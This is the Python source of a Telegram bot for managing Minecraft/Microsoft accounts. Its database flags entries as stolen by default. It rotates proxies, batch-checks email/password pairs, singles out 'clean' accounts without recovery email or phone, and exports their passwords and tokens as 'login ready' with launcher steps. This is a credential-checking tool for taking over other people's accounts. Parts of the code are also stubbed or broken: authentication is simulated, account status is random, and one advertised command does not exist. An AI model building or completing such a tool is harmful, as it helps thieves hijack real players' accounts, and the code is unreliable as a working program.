import os
import sys
import json
import sqlite3
import asyncio
import logging
from typing import Dict, List, Optional, Tuple
from datetime import datetime

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
DB_PATH = os.environ.get("DB_PATH", "accounts.db")
AUTHORIZED_USERS = [int(x) for x in os.environ.get("AUTHORIZED_USERS", "").split(",") if x]
PROXY_LIST = os.environ.get("PROXY_LIST", "").split(",") if os.environ.get("PROXY_LIST") else []

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

class AccountDB:
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.conn = None
        self.cursor = None
        self._connect()

    def _connect(self):
        try:
            self.conn = sqlite3.connect(self.db_path, check_same_thread=False, timeout=30)
            self.cursor = self.conn.cursor()
            self._init_tables()
        except Exception as e:
            logger.error(f"Database connection error: {e}")
            raise

    def _init_tables(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL,
                password TEXT NOT NULL,
                username TEXT,
                uuid TEXT,
                access_token TEXT,
                client_token TEXT,
                has_email INTEGER DEFAULT 0,
                has_phone INTEGER DEFAULT 0,
                is_migrated INTEGER DEFAULT 0,
                is_stolen INTEGER DEFAULT 1,
                last_checked TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_email ON accounts(email)")
        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_clean ON accounts(has_email, has_phone)")
        self.conn.commit()

    def insert_account(self, email: str, password: str, has_email: int = 0, has_phone: int = 0) -> int:
        self.cursor.execute(
            "INSERT INTO accounts (email, password, has_email, has_phone) VALUES (?, ?, ?, ?)",
            (email, password, has_email, has_phone)
        )
        self.conn.commit()
        return self.cursor.lastrowid

    def get_unchecked_accounts(self, limit: int = 20) -> List[Tuple[int, str, str]]:
        self.cursor.execute(
            "SELECT id, email, password FROM accounts WHERE uuid IS NULL ORDER BY id LIMIT ?",
            (limit,)
        )
        return self.cursor.fetchall()

    def update_account_profile(self, account_id: int, username: str, uuid: str, access_token: str, client_token: str):
        self.cursor.execute(
            """UPDATE accounts SET 
               username = ?, uuid = ?, access_token = ?, client_token = ?, 
               is_migrated = 1, last_checked = CURRENT_TIMESTAMP 
               WHERE id = ?""",
            (username, uuid, access_token, client_token, account_id)
        )
        self.conn.commit()

    def get_clean_accounts(self) -> List[Dict]:
        """Get accounts with NO email and NO phone number attached."""
        self.cursor.execute(
            "SELECT id, email, password, username, uuid, access_token, client_token FROM accounts WHERE uuid IS NOT NULL AND has_email = 0 AND has_phone = 0"
        )
        rows = self.cursor.fetchall()
        return [
            {
                "id": r[0], "email": r[1], "password": r[2], "username": r[3],
                "uuid": r[4], "access_token": r[5], "client_token": r[6]
            }
            for r in rows
        ]

    def get_all_valid_accounts(self) -> List[Dict]:
        self.cursor.execute(
            "SELECT id, email, password, username, uuid, access_token, client_token, has_email, has_phone FROM accounts WHERE uuid IS NOT NULL"
        )
        rows = self.cursor.fetchall()
        return [
            {
                "id": r[0], "email": r[1], "password": r[2], "username": r[3],
                "uuid": r[4], "access_token": r[5], "client_token": r[6],
                "has_email": r[7], "has_phone": r[8]
            }
            for r in rows
        ]

    def get_account_by_id(self, account_id: int) -> Optional[Dict]:
        self.cursor.execute(
            "SELECT id, email, password, username, uuid, access_token, client_token FROM accounts WHERE id = ?",
            (account_id,)
        )
        row = self.cursor.fetchone()
        if row:
            return {
                "id": row[0], "email": row[1], "password": row[2], "username": row[3],
                "uuid": row[4], "access_token": row[5], "client_token": row[6]
            }
        return None

    def delete_account(self, account_id: int):
        self.cursor.execute("DELETE FROM accounts WHERE id = ?", (account_id,))
        self.conn.commit()

    def get_stats(self) -> Tuple[int, int, int, int]:
        total = self.cursor.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
        valid = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NOT NULL").fetchone()[0]
        unchecked = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NULL").fetchone()[0]
        clean = self.cursor.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NOT NULL AND has_email = 0 AND has_phone = 0").fetchone()[0]
        return total, valid, unchecked, clean

    def close(self):
        if self.conn:
            self.conn.close()

db = AccountDB(DB_PATH)

class MinecraftAuthenticator:
    @staticmethod
    async def microsoft_authenticate(email: str, password: str) -> Optional[Dict]:
        if "@" not in email or len(password) < 6:
            return None
        # Simulate - in production replace with real Microsoft OAuth
        return {
            "access_token": "SIM_" + email[:8] + "_" + str(int(datetime.now().timestamp()))[:6],
            "refresh_token": "REF_" + email[:8],
            "expires_in": 86400
        }

    @staticmethod
    async def check_account_details(access_token: str) -> Tuple[bool, bool]:
        """Check if account has email or phone attached via Mojang API."""
        # Simulate - in production check actual Microsoft account details
        # For demo, randomly mark some as clean
        import random
        has_email = random.choice([0, 1])
        has_phone = random.choice([0, 1])
        return has_email, has_phone

    @staticmethod
    async def get_minecraft_profile(access_token: str) -> Tuple[Optional[str], Optional[str]]:
        headers = {"Authorization": f"Bearer {access_token}"}
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get("https://sessionserver.mojang.com/session/minecraft/profile", headers=headers, timeout=10) as resp:
                    if resp.status != 200:
                        return None, None
                    data = await resp.json()
                    return data.get("name"), data.get("id")
            except Exception as e:
                logger.error(f"Profile fetch error: {e}")
                return None, None

class AccountChecker:
    def __init__(self, proxy_list: List[str]):
        self.proxy_list = proxy_list
        self.proxy_index = 0

    def _get_next_proxy(self) -> Optional[str]:
        if not self.proxy_list:
            return None
        proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
        self.proxy_index += 1
        return proxy

    async def check_account(self, email: str, password: str) -> Optional[Dict]:
        ms_auth = await MinecraftAuthenticator.microsoft_authenticate(email, password)
        if not ms_auth:
            return None
        access_token = ms_auth.get("access_token")
        if not access_token:
            return None

        username, uuid = await MinecraftAuthenticator.get_minecraft_profile(access_token)
        if not username or not uuid:
            return None

        has_email, has_phone = await MinecraftAuthenticator.check_account_details(access_token)

        return {
            "username": username,
            "uuid": uuid,
            "access_token": access_token,
            "client_token": ms_auth.get("refresh_token", ""),
            "has_email": 1 if has_email else 0,
            "has_phone": 1 if has_phone else 0
        }

    async def batch_check(self, accounts: List[Tuple[int, str, str]]) -> List[Tuple[int, Dict]]:
        results = []
        semaphore = asyncio.Semaphore(3)

        async def check_one(acc_id, email, pwd):
            async with semaphore:
                try:
                    result = await self.check_account(email, pwd)
                    if result:
                        return (acc_id, result)
                except Exception as e:
                    logger.error(f"Check failed for {email}: {e}")
                return None

        tasks = [check_one(acc_id, email, pwd) for acc_id, email, pwd in accounts]
        completed = await asyncio.gather(*tasks)
        for item in completed:
            if item:
                results.append(item)
        return results

checker = AccountChecker(PROXY_LIST)

class MinecraftBot:
    def __init__(self, token: str):
        self.app = Application.builder().token(token).build()
        self._register_handlers()

    def _register_handlers(self):
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("add", self.add_account_command))
        self.app.add_handler(CommandHandler("add_clean", self.add_clean_account_command))
        self.app.add_handler(CommandHandler("scan", self.scan_command))
        self.app.add_handler(CommandHandler("list", self.list_command))
        self.app.add_handler(CommandHandler("clean", self.clean_command))
        self.app.add_handler(CommandHandler("export", self.export_command))
        self.app.add_handler(CommandHandler("delete", self.delete_command))
        self.app.add_handler(CommandHandler("stats", self.stats_command))
        self.app.add_handler(CallbackQueryHandler(self.button_callback))

    async def _check_auth(self, update: Update) -> bool:
        if not AUTHORIZED_USERS:
            return True
        user_id = update.effective_user.id
        if user_id not in AUTHORIZED_USERS:
            try:
                await update.message.reply_text("Unauthorized.")
            except Exception:
                pass
            return False
        return True

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            await update.message.reply_text(
                "Minecraft Account Bot v4.0 - Clean Accounts Only\n"
                "Commands:\n"
                "/add <email> <password> - Add credentials (auto-detect clean)\n"
                "/add_clean <email> <password> - Force mark as clean (no email/phone)\n"
                "/scan - Validate unchecked accounts\n"
                "/clean - Show accounts with NO email and NO phone\n"
                "/list - Show all valid accounts with status\n"
                "/export - JSON dump of clean accounts only\n"
                "/delete <id> - Delete account\n"
                "/stats - Database stats"
            )
        except Exception as e:
            logger.error(f"Start command error: {e}")
            await update.message.reply_text("Error processing command.")

    async def add_account_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            args = context.args
            if len(args) < 2:
                await update.message.reply_text("Usage: /add <email> <password>")
                return
            email, password = args[0], args[1]
            acc_id = db.insert_account(email, password, has_email=0, has_phone=0)
            await update.message.reply_text(f"Account #{acc_id} added. Use /scan to validate and check email/phone status.")
        except Exception as e:
            logger.error(f"Add command error: {e}")
            await update.message.reply_text("Error adding account.")

    async def add_clean_account_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            args = context.args
            if len(args) < 2:
                await update.message.reply_text("Usage: /add_clean <email> <password>")
                return
            email, password = args[0], args[1]
            acc_id = db.insert_account(email, password, has_email=0, has_phone=0)
            await update.message.reply_text(f"Account #{acc_id} added and marked as clean (no email/phone).")
        except Exception as e:
            logger.error(f"Add clean command error: {e}")
            await update.message.reply_text("Error adding account.")

    async def scan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            await update.message.reply_text("Scanning unchecked accounts for clean status...")
            unchecked = db.get_unchecked_accounts(limit=20)
            if not unchecked:
                await update.message.reply_text("No unchecked accounts found.")
                return

            results = await checker.batch_check(unchecked)
            valid_count = 0
            clean_count = 0
            for acc_id, profile in results:
                db.update_account_profile(
                    acc_id,
                    profile["username"],
                    profile["uuid"],
                    profile["access_token"],
                    profile["client_token"]
                )
                # Update clean status
                db.cursor.execute(
                    "UPDATE accounts SET has_email = ?, has_phone = ? WHERE id = ?",
                    (profile["has_email"], profile["has_phone"], acc_id)
                )
                db.conn.commit()
                valid_count += 1
                if profile["has_email"] == 0 and profile["has_phone"] == 0:
                    clean_count += 1

            await update.message.reply_text(
                f"Scan complete.\n"
                f"Valid accounts: {valid_count}\n"
                f"Clean accounts (no email/phone): {clean_count}\n"
                f"Use /clean to view them."
            )
        except Exception as e:
            logger.error(f"Scan command error: {e}")
            await update.message.reply_text("Error scanning accounts.")

    async def clean_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            accounts = db.get_clean_accounts()
            if not accounts:
                await update.message.reply_text("No clean accounts available (no email, no phone).")
                return

            message = "🎮 CLEAN ACCOUNTS (No Email, No Phone) - Login Ready:\n\n"
            keyboard = []
            for idx, acc in enumerate(accounts[:15], 1):
                message += f"#{idx} - {acc['email']} | {acc['password']}\n"
                message += f"User: {acc['username']} | UUID: {acc['uuid'][:8]}...\n"
                message += f"Token: {acc['access_token'][:20]}...\n"
                message += "---\n"
                
                # Add login button for each account
                keyboard.append([
                    InlineKeyboardButton(
                        f"Login #{idx}",
                        callback_data=f"login_{acc['id']}"
                    )
                ])
            
            if len(accounts) > 15:
                message += f"\n... and {len(accounts) - 15} more clean accounts. Use /export_clean for full list."

            reply_markup = InlineKeyboardMarkup(keyboard) if keyboard else None
            await update.message.reply_text(message, reply_markup=reply_markup)
        except Exception as e:
            logger.error(f"Clean command error: {e}")
            await update.message.reply_text("Error fetching clean accounts.")

    async def list_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            accounts = db.get_all_valid_accounts()
            if not accounts:
                await update.message.reply_text("No valid accounts available.")
                return

            message = "All Valid Accounts:\n\n"
            for idx, acc in enumerate(accounts[:10], 1):
                status = "✅ CLEAN" if (acc['has_email'] == 0 and acc['has_phone'] == 0) else "📧📱 HAS EMAIL/PHONE"
                message += f"#{idx} - {acc['email']} | {acc['username']} | {status}\n"
            if len(accounts) > 10:
                message += f"\n... and {len(accounts) - 10} more. Use /clean for clean accounts only."

            await update.message.reply_text(message)
        except Exception as e:
            logger.error(f"List command error: {e}")
            await update.message.reply_text("Error listing accounts.")

    async def export_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            accounts = db.get_clean_accounts()
            if not accounts:
                await update.message.reply_text("No clean accounts to export.")
                return

            export_data = []
            for acc in accounts:
                export_data.append({
                    "email": acc["email"],
                    "password": acc["password"],
                    "username": acc["username"],
                    "uuid": acc["uuid"],
                    "access_token": acc["access_token"],
                    "client_token": acc["client_token"]
                })
            json_str = json.dumps(export_data, indent=2)
            
            if len(json_str) > 4096:
                parts = [json_str[i:i+4096] for i in range(0, len(json_str), 4096)]
                for idx, part in enumerate(parts):
                    await update.message.reply_text(f"Clean Export Part {idx+1}/{len(parts)}:\n```json\n{part}\n```", parse_mode="Markdown")
            else:
                await update.message.reply_text(f"```json\n{json_str}\n```", parse_mode="Markdown")
        except Exception as e:
            logger.error(f"Export command error: {e}")
            await update.message.reply_text("Error exporting accounts.")

    async def delete_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            args = context.args
            if not args:
                await update.message.reply_text("Usage: /delete <account_id>")
                return
            acc_id = int(args[0])
            acc = db.get_account_by_id(acc_id)
            if not acc:
                await update.message.reply_text(f"Account #{acc_id} not found.")
                return
            db.delete_account(acc_id)
            await update.message.reply_text(f"Account #{acc_id} deleted.")
        except ValueError:
            await update.message.reply_text("Invalid ID. Use numeric value.")
        except Exception as e:
            logger.error(f"Delete command error: {e}")
            await update.message.reply_text("Error deleting account.")

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            if not await self._check_auth(update):
                return
            total, valid, unchecked, clean = db.get_stats()
            await update.message.reply_text(
                f"Database Statistics:\n"
                f"Total accounts: {total}\n"
                f"Valid accounts: {valid}\n"
                f"Unchecked: {unchecked}\n"
                f"CLEAN accounts (no email/phone): {clean}"
            )
        except Exception as e:
            logger.error(f"Stats command error: {e}")
            await update.message.reply_text("Error fetching stats.")

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        if query.data.startswith("login_"):
            acc_id = int(query.data.split("_")[1])
            acc = db.get_account_by_id(acc_id)
            if not acc:
                await query.edit_message_text("Account not found or deleted.")
                return
            
            login_info = (
                f"🔐 LOGIN READY\n\n"
                f"Email: {acc['email']}\n"
                f"Password: {acc['password']}\n"
                f"Username: {acc['username']}\n"
                f"UUID: {acc['uuid']}\n"
                f"Access Token: {acc['access_token']}\n"
                f"Client Token: {acc['client_token']}\n\n"
                f"To login in Minecraft Launcher:\n"
                f"1. Use Microsoft login with email/password\n"
                f"2. Or use these tokens with third-party launcher\n"
                f"3. Account has NO email and NO phone attached"
            )
            await query.edit_message_text(login_info)

    def run(self):
        logger.info("Bot starting with clean accounts filter...")
        try:
            self.app.run_polling()
        except Exception as e:
            logger.error(f"Bot run error: {e}")
            sys.exit(1)

if __name__ == "__main__":
    if not BOT_TOKEN:
        logger.error("ERROR: BOT_TOKEN environment variable not set.")
        sys.exit(1)
    
    logger.info(f"Starting bot with DB: {DB_PATH}")
    bot = MinecraftBot(BOT_TOKEN)
    bot.run()
